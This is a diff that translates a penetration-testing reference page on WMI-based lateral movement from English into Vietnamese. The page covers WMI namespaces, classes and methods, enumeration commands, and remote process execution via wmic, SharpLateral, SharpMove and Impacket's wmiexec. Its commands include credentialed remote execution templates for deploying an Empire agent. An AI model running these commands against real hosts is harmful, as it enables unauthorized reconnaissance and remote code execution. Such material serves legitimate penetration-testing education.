@@ -2,18 +2,18 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## How It Works Explained
+## Giải thích cách hoạt động
 
-Processes can be opened on hosts where the username and either password or hash are known through the use of WMI. Commands are executed using WMI by Wmiexec, providing a semi-interactive shell experience.
+Có thể mở tiến trình trên các host khi đã biết tên người dùng và mật khẩu hoặc hash bằng WMI. Wmiexec thực thi lệnh thông qua WMI, mang lại trải nghiệm shell bán tương tác.
 
-**dcomexec.py:** Using different DCOM endpoints, this script offers a semi-interactive shell similar to `wmiexec.py`. The selected `-object` value chooses the endpoint; supported objects include `MMC20.Application`, `ShellWindows`, and `ShellBrowserWindow`, with the latter providing the Shell Browser Window technique highlighted in the original walkthrough.<sup>[[2]](#references)[[3]](#references)</sup>
+**dcomexec.py:** Bằng cách sử dụng các endpoint DCOM khác nhau, script này cung cấp shell bán tương tác tương tự `wmiexec.py`. Giá trị `-object` được chọn sẽ quyết định endpoint; các object được hỗ trợ gồm `MMC20.Application`, `ShellWindows` và `ShellBrowserWindow`. Object cuối cùng triển khai kỹ thuật Shell Browser Window được nhấn mạnh trong hướng dẫn ban đầu.<sup>[[2]](#references)[[3]](#references)</sup>
 
-## WMI Fundamentals
+## Kiến thức cơ bản về WMI
 
 ### Namespace
 
-Structured in a directory-style hierarchy, WMI's top-level container is \root, under which additional directories, referred to as namespaces, are organized.<sup>[[1]](#references)</sup>
-Commands to list namespaces:
+Được tổ chức theo cấu trúc phân cấp dạng thư mục, container cấp cao nhất của WMI là \root; bên dưới là các thư mục bổ sung, gọi là namespace.<sup>[[1]](#references)</sup>
+Lệnh liệt kê namespace:
 
 ```bash
 # Retrieval of Root namespaces
@@ -26,24 +26,24 @@ Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | s
 Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 ```
 
-Classes within a namespace can be listed using:
+Có thể liệt kê các lớp trong một namespace bằng cách sử dụng:
 
 ```bash
 gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
 gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 
-### **Classes**
+### **Các lớp**
 
-Knowing a WMI class name, such as win32_process, and the namespace it resides in is crucial for any WMI operation.
-Commands to list classes beginning with `win32`:
+Việc biết tên lớp WMI, chẳng hạn như win32_process, và namespace chứa lớp đó là điều quan trọng đối với mọi thao tác WMI.
+Các lệnh liệt kê những lớp bắt đầu bằng `win32`:
 
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
 gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
 ```
 
-Invocation of a class:
+Cách gọi một lớp:
 
 ```bash
 # Defaults to "root/cimv2" when namespace isn't specified
@@ -51,9 +51,9 @@ Get-WmiObject -Class win32_share
 Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
 ```
 
-### Methods
+### Phương thức
 
-Methods, which are one or more executable functions of WMI classes, can be executed.
+Có thể thực thi các phương thức, tức là một hoặc nhiều hàm có thể thực thi của các lớp WMI.
 
 ```bash
 # Class loading, method listing, and execution
@@ -67,11 +67,11 @@ $c.methods
 Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
 ```
 
-## WMI Enumeration
+## Liệt kê WMI
 
-### WMI Service Status
+### Trạng thái dịch vụ WMI
 
-Commands to verify if the WMI service is operational:
+Các lệnh để xác minh dịch vụ WMI có đang hoạt động hay không:
 
 ```bash
 # WMI service status check
@@ -81,16 +81,16 @@ Get-Service Winmgmt
 net start | findstr "Instrumentation"
 ```
 
-### System and Process Information
+### Thông tin hệ thống và tiến trình
 
-Gathering system and process information through WMI:
+Thu thập thông tin hệ thống và tiến trình thông qua WMI:
 
 ```bash
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
 Get-WmiObject win32_process | Select Name, Processid
 ```
 
-For attackers, WMI is a potent tool for enumerating sensitive data about systems or domains.<sup>[[1]](#references)</sup>
+Đối với kẻ tấn công, WMI là công cụ mạnh mẽ để liệt kê dữ liệu nhạy cảm về hệ thống hoặc miền.<sup>[[1]](#references)</sup>
 
 ```bash
 wmic computerystem list full /format:list
@@ -101,21 +101,21 @@ wmic group list /format:list
 wmic sysaccount list /format:list
 ```
 
-Remote querying of WMI for specific information, such as local admins or logged-on users, is feasible with careful command construction.
+Có thể truy vấn WMI từ xa để lấy thông tin cụ thể, chẳng hạn như quản trị viên cục bộ hoặc người dùng đã đăng nhập, nếu xây dựng lệnh cẩn thận.
 
-### **Manual Remote WMI Querying**
+### **Truy vấn WMI từ xa thủ công**
 
-Stealthy identification of local admins on a remote machine and logged-on users can be achieved through specific WMI queries. `wmic` also supports reading from a text file to execute commands on multiple nodes simultaneously.<sup>[[1]](#references)</sup>
+Có thể âm thầm xác định quản trị viên cục bộ trên máy từ xa và người dùng đã đăng nhập thông qua các truy vấn WMI cụ thể. `wmic` cũng hỗ trợ đọc từ tệp văn bản để thực thi lệnh đồng thời trên nhiều nút.<sup>[[1]](#references)</sup>
 
-To remotely execute a process over WMI, such as deploying an Empire agent, the following command structure is employed, with successful execution indicated by a return value of "0":<sup>[[1]](#references)</sup>
+Để thực thi từ xa một tiến trình thông qua WMI, chẳng hạn như triển khai Empire agent, sử dụng cấu trúc lệnh sau. Giá trị trả về "0" cho biết lệnh đã thực thi thành công:<sup>[[1]](#references)</sup>
 
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
 
-This process illustrates WMI's capability for remote execution and system enumeration, highlighting its utility for both system administration and penetration testing.
+Quy trình này minh họa khả năng thực thi từ xa và liệt kê hệ thống của WMI, làm nổi bật tính hữu ích của nó trong cả quản trị hệ thống lẫn kiểm thử xâm nhập.
 
-## Automatic Tools
+## Công cụ tự động
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 
@@ -139,14 +139,12 @@ SharpMove.exe action=create computername=remote.host.local command="C:\windows\t
 SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
 ```
 
-- You could also use **Impacket's `wmiexec`**.
+- Bạn cũng có thể sử dụng **`wmiexec` của Impacket**.
 
 
 ## References
 
-- [1] [Using Credentials to Own Windows Boxes - Part 3 (WMI and WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
+- [1] [Sử dụng thông tin xác thực để chiếm quyền các máy Windows - Phần 3 (WMI và WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
 - [2] [Fortra Impacket – dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
-- [3] [Beginner's Guide to Impacket Tool Kit, Part 1 – Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
-
-
+- [3] [Hướng dẫn dành cho người mới bắt đầu về bộ công cụ Impacket, Phần 1 – Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
 {{#include ../../banners/hacktricks-training.md}}
